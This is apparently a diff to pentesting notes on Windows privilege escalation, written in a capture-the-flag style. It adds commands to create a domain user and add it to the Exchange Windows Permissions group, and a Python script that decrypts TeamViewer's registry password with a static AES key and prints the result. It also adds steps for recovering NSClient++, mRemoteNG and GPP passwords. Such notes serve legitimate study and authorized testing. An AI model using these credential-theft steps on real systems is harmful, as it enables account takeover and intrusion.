@@ -802,6 +802,210 @@ powershell -command "Get-Clipboard"
 
 ## Misc
 
+### AD Recycle Bin Group
+
+Search for deleted objects and filter for users:
+
+```text
+Get-ADObject -SearchBase "CN=Deleted Objects,DC=domain,DC=local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *`
+```
+
+### Exchange Windows Permissions
+
+Create your own user
+
+```text
+net user username password /add /domain
+```
+
+Add the newly created user to the group Exchange Windows Permissions:
+
+```text
+net group "Exchange Windows Permissions" /add username
+```
+
+### TeamViewer
+
+```text
+PS C:\> tasklist | findstr /i 'TeamViewer'
+TeamViewer_Service.exe        3048                            0     18,404 K
+```
+
+TeamViewer is an remote management software. Since this is the server, it will have credentials used for others to connect to it.
+
+I can get the version by looking in the `\Program Files (x86)\TeamViewer`:
+
+```text
+PS C:\Program Files (x86)\TeamViewer> ls
+
+
+    Directory: C:\Program Files (x86)\TeamViewer
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        2/27/2020  10:35 AM                Version7
+```
+
+There’s a list of registry keys, and the one that looks like version 7 is `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`. For each location, it looks for the following values:
+
+OptionsPasswordAES SecurityPasswordAES SecurityPasswordExported ServerPasswordAES ProxyPasswordAES LicenseKeyAES
+
+I can take a look at that registry key:
+
+```text
+PS C:\Program Files (x86)\TeamViewer> cd HKLM:\software\wow6432node\teamviewer\version7
+PS HKLM:\software\wow6432node\teamviewer\version7> get-itemproperty -path .
+
+
+StartMenuGroup            : TeamViewer 7
+InstallationDate          : 2020-02-20
+InstallationDirectory     : C:\Program Files (x86)\TeamViewer\Version7
+Always_Online             : 1
+Security_ActivateDirectIn : 0
+Version                   : 7.0.43148
+ClientIC                  : 301094961
+PK                        : {191, 173, 42, 237...}
+SK                        : {248, 35, 152, 56...}
+LastMACUsed               : {, 005056B9641D}
+MIDInitiativeGUID         : {514ed376-a4ee-4507-a28b-484604ed0ba0}
+MIDVersion                : 1
+ClientID                  : 1769137322
+CUse                      : 1
+LastUpdateCheck           : 1584564540
+UsageEnvironmentBackup    : 1
+SecurityPasswordAES       : {255, 155, 28, 115...}
+MultiPwdMgmtIDs           : {admin}
+MultiPwdMgmtPWDs          : {357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77}
+Security_PasswordStrength : 3
+PSPath                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer\vers
+                            ion7
+PSParentPath              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\wow6432node\teamviewer
+PSChildName               : version7
+PSDrive                   : HKLM
+PSProvider                : Microsoft.PowerShell.Core\Registry
+```
+
+`SecurityPasswordAES` is there from the list above. It just dumps a list of integers:
+
+```text
+PS HKLM:\software\wow6432node\teamviewer\version7> (get-itemproperty -path .).SecurityPasswordAES
+255
+155
+28
+115
+214
+107
+206
+49
+172
+65
+62
+174
+19
+27
+70
+79
+88
+47
+108
+226
+209
+225
+243
+218
+126
+141
+55
+107
+38
+57
+78
+91
+```
+
+#### Decrypt Password
+
+{% embed url="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/teamviewer\_passwords.rb" %}
+
+After some research I found that it’s using AES128 in CBC mode with a static key and iv. I can easily recreate this in a few lines of Python but we need a library which is this one:
+
+```text
+❯ pip3 install pycrypto
+Defaulting to user installation because normal site-packages is not writeable
+Collecting pycrypto
+  Using cached pycrypto-2.6.1.tar.gz (446 kB)
+Building wheels for collected packages: pycrypto
+  Building wheel for pycrypto (setup.py) ... done
+  Created wheel for pycrypto: filename=pycrypto-2.6.1-cp39-cp39-linux_x86_64.whl size=526405 sha256=eb0f71d1e11861ab7653b83ad0e3b0b50d37acb34e0f43641717b832ed3c6e61
+  Stored in directory: /home/kali/.cache/pip/wheels/9d/29/32/8b8f22481bec8b0fbe7087927336ec167faff2ed9db849448f
+Successfully built pycrypto
+Installing collected packages: pycrypto
+Successfully installed pycrypto-2.6.1
+```
+
+The script is as follows:
+
+```python
+#!/usr/bin/env python3
+
+from Crypto.Cipher import AES
+
+key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
+iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
+# Read as bytes
+cipher = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])
+
+aes = AES.new(key, AES.MODE_CBC, IV=iv)
+# UTF-16 because is Windows and Strip Null Bytes
+password = aes.decrypt(cipher).decode("utf-16").rstrip("\x00")
+
+print(f"[+] The password is: {password}")
+```
+
+Then we can decrypt the password.
+
+```text
+❯ python3 decrypt.py
+[+] The password is: !R3m0te!
+```
+
+#### NSClient++
+
+View and undocumented key:
+
+```text
+type nsclient.ini
+```
+
+Display password with `nscp.exe`:
+
+```text
+nscp.exe web -- password --display
+```
+
+### mRemoteNG-Decrypt
+
+Read the password from XMLfile:
+
+```text
+type confCons.xml
+```
+
+Decrypt the password cipher text:
+
+```text
+python3 mremoteng_decrypt.py -s CIPHER
+```
+
+### Groups.xml
+
+We can use GPP decrypt to get the password:
+
+```text
+gpp-decrypt CIPHER_HERE
+```
+
 ### ExploitCapcom
 
 ### SeLoadDriverPrivilege
